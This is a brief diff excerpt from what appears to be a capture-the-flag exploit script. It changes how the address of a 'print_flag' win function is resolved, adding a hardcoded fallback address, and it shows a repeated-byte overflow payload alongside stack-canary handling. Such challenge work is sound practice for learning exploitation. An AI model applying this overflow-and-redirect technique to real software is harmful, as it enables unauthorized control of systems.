@@ -21,7 +21,7 @@ else:
 
 # log.info(f"Canary: {canary:x}")
 
-win = exe.symbols['print_flag']
+win = exe.sym['print_flag'] if 'print_flag' in exe.symbols else 0x401176
 # log.info(hex(win))
 
 payload = b'AAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBB'
